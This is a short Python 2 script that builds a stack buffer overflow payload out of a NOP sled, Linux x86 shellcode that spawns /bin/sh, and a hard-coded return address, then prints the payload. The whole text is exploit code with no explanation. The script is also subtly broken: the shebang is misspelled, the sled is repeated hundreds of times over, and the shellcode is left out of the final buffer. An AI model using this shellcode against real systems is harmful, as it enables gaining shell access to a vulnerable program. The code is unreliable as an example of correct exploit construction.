#!/bin/prython
buffersize = 564
nopsled = "\x90"*200
shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
eip = "\x40\xf3\xff\xbf"
buffer = nopsled * (buffersize-len(shellcode)) + eip
print buffer
   
 
 
